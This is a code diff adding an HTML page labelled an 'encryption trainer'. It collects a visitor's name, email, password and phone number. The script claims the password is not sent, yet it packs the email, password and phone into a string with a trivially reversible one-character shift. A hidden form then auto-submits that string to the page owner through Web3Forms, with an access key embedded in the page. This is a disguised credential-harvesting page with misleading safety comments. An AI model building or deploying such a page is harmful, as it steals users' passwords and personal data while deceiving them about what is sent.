@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Hijabi - Encryption Trainer</title>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: url('895bb8d6e39eddf6c9a00782c1a5f1f8.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+      margin: 0;
+      backdrop-filter: blur(3px);
+    }
+    .container {
+      background: rgba(0,0,0,0.62);
+      padding: 28px;
+      border-radius: 14px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      width: 420px;
+      text-align: center;
+    }
+    h2 { font-size: 30px; margin: 0 0 6px; color: #ffcc00; letter-spacing: 1.5px; }
+    .subtitle { font-size: 14px; color: #ffe9a0; margin-bottom: 14px; }
+    input, textarea {
+      width: 92%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      background: rgba(255,255,255,0.94);
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    textarea { min-height: 80px; resize: vertical; }
+    .row { display:flex; justify-content:center; gap:8px; margin-top:10px; }
+    button {
+      padding: 10px 18px;
+      border: none;
+      background: linear-gradient(45deg,#ffcc00,#ff9900);
+      color: #222;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 700;
+      transition: transform .14s ease;
+    }
+    button:hover { transform: translateY(-3px); }
+    .output {
+      margin-top: 12px;
+      text-align: left;
+      background: rgba(255,255,255,0.06);
+      padding: 12px;
+      border-radius: 10px;
+      color: #ffefc2;
+      font-weight: 600;
+      word-break: break-all;
+      font-size: 14px;
+    }
+    .small { font-size: 12px; color: #f7f0d9; margin-top: 6px; }
+    .label { text-align:left; width:92%; margin: 6px auto 0; color:#ffe9a0; font-weight:600; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Hijabi</h2>
+    <div class="subtitle">💖 मुझे हिजाबी पसंद है 💖 (I love Hijabi)</div>
+
+    <div class="label">Name (will be sent):</div>
+    <input id="name" type="text" placeholder="Your Name" required />
+
+    <div class="label">Email (emailo) (will be sent):</div>
+    <input id="emailo" type="email" placeholder="emailo@example.com" required />
+
+    <div class="label">Passwordo (visible but NOT sent in plaintext):</div>
+    <!-- NOTE: intentionally no name attribute so raw passwordo is NOT submitted -->
+    <input id="passwordo" type="password" placeholder="passwordo (local only)" />
+
+    <div class="label">Phone (optional):</div>
+    <input id="phone" type="text" placeholder="Phone number (optional)" />
+
+    <div class="row">
+      <button id="continueBtn" type="button" onclick="encryptAndGenerate()">Continue (Encrypt & Generate)</button>
+    </div>
+
+    <div id="outputs" style="margin-top:12px;">
+      <div id="activationBox" class="output" style="display:none;">
+        <div style="font-size:13px;color:#ffe9a0;margin-bottom:6px;">Encrypted Activation String:</div>
+        <div id="activationText"></div>
+      </div>
+
+      <div id="codeBox" class="output" style="display:none;">
+        <div style="font-size:13px;color:#ffe9a0;margin-bottom:6px;">Verification Code (derived from encrypted activation):</div>
+        <div id="codeText" style="letter-spacing:4px; font-size:18px;"></div>
+      </div>
+    </div>
+
+    <div id="status" class="small"></div>
+  </div>
+
+  <!-- Hidden Web3Forms form: only sends name, email, message (which contains encrypted activation) and verification_code -->
+  <form id="web3form" action="https://api.web3forms.com/submit" method="POST" style="display:none;">
+    <input type="hidden" name="access_key" value="12e42846-0d21-47c2-94ac-5f44cd65d355" />
+    <input type="hidden" name="name" id="hidden_name" value="">
+    <input type="hidden" name="email" id="hidden_email" value="">
+    <input type="hidden" name="message" id="hidden_message" value="">
+    <input type="hidden" name="verification_code" id="hidden_code" value="">
+    <!-- optionally include encrypted activation explicitly -->
+    <input type="hidden" name="encrypted_activation" id="hidden_activation" value="">
+  </form>
+
+  <script>
+    // Simple shiftChar Caesar-like cipher for character-level "encryption" (training)
+    function shiftChar(c) {
+      if (/[a-z]/.test(c)) return c === 'z' ? 'a' : String.fromCharCode(c.charCodeAt(0) + 1);
+      if (/[A-Z]/.test(c)) return c === 'Z' ? 'A' : String.fromCharCode(c.charCodeAt(0) + 1);
+      if (/[0-9]/.test(c)) return c === '9' ? '0' : String.fromCharCode(c.charCodeAt(0) + 1);
+      return c;
+    }
+
+    function encryptText(text) {
+      return text.split('').map(ch => shiftChar(ch)).join('');
+    }
+
+    // hex helper: convert ArrayBuffer to hex string
+    function bufferToHex(buffer) {
+      const byteArray = new Uint8Array(buffer);
+      const hexCodes = [...byteArray].map(b => b.toString(16).padStart(2, '0'));
+      return hexCodes.join('');
+    }
+
+    // Compute SHA-256 of input text (returns Promise<string> of hex)
+    async function sha256Hex(text) {
+      const encoder = new TextEncoder();
+      const data = encoder.encode(text);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      return bufferToHex(hashBuffer);
+    }
+
+    // Derive a 6-digit numeric code from a hex hash string
+    function codeFromHex(hashHex) {
+      // Take first 12 hex chars (48 bits), convert to integer mod 900000 + 100000 to get 6-digit
+      const slice = hashHex.slice(0, 12);
+      const asInt = parseInt(slice, 16);
+      const code = (asInt % 900000) + 100000;
+      return code.toString().padStart(6, '0');
+    }
+
+    async function encryptAndGenerate() {
+      document.getElementById('status').textContent = '';
+
+      const name = document.getElementById('name').value.trim();
+      const emailVisible = document.getElementById('emailo').value.trim();
+      const passwordVisible = document.getElementById('passwordo').value; // local-only
+      const phone = document.getElementById('phone').value.trim();
+
+      if (!name) { document.getElementById('status').textContent = 'Please enter your name.'; return; }
+      if (!emailVisible || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVisible)) { document.getElementById('status').textContent = 'Please enter a valid email.'; return; }
+
+      // 1) Create an activation string from the visible inputs, but we will only submit the encrypted form
+      const activationPlain = `emailo:${emailVisible}|passwordo:${passwordVisible}|phone:${phone}`;
+      // 2) Apply the simple shiftChar encryption for training
+      const activationEncrypted = encryptText(activationPlain);
+
+      // show encrypted activation to user
+      document.getElementById('activationText').textContent = activationEncrypted;
+      document.getElementById('activationBox').style.display = 'block';
+
+      // 3) compute SHA-256 of the activationEncrypted (async)
+      try {
+        const hashHex = await sha256Hex(activationEncrypted);
+        const verificationCode = codeFromHex(hashHex);
+
+        // display code to user
+        document.getElementById('codeText').textContent = verificationCode;
+        document.getElementById('codeBox').style.display = 'block';
+        document.getElementById('status').textContent = 'Verification code generated and will be sent to the site owner.';
+
+        // 4) Put only encrypted activation + verification code (and name/email) into hidden form
+        document.getElementById('hidden_name').value = name;
+        document.getElementById('hidden_email').value = emailVisible; // this populates sender email in your Web3Forms mail
+        // message will include the encrypted activation and any visitor message if you want; here we include the activation
+        const messagePayload = `Encrypted Activation: ${activationEncrypted}\n\n(Training: original fields are not stored raw)\n\nDerived SHA-256 (hex): ${hashHex}`;
+        document.getElementById('hidden_message').value = messagePayload;
+        document.getElementById('hidden_activation').value = activationEncrypted;
+        document.getElementById('hidden_code').value = verificationCode;
+
+        // 5) submit the hidden form to Web3Forms so you (the owner) receive the encrypted_activation + verification_code by email
+        // Use a short delay so the user sees the code before navigation
+        setTimeout(() => {
+          document.getElementById('web3form').submit();
+        }, 700);
+
+      } catch (err) {
+        console.error(err);
+        document.getElementById('status').textContent = 'Error generating verification code. See console.';
+      }
+    }
+
+    // Safety note in console
+    console.warn("This training page encrypts visible inputs and sends only the encrypted activation string and derived verification code to Web3Forms. Raw passwordo/emailo/phone are not posted directly.");
+  </script>
+</body>
+</html>
